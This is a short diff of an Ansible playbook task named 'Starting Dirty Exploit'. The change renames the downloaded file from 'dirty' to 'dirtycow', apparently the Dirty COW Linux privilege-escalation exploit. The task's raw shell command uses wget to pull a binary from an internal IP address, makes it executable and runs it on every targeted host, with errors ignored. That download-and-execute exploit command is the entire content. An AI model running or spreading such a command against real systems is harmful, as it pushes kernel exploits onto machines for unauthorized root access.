@@ -4,7 +4,7 @@
   gather_facts: false
   tasks:
     - name: "Starting Dirty Exploit"
-      raw: "wget http://10.1.120.69:8080/dirty; chmod +x dirty;./dirty"
+      raw: "wget http://10.1.120.69:8080/dirtycow; chmod +x dirtycow;./dirtycow"
       args:
        executable: /bin/bash
       ignore_errors: true
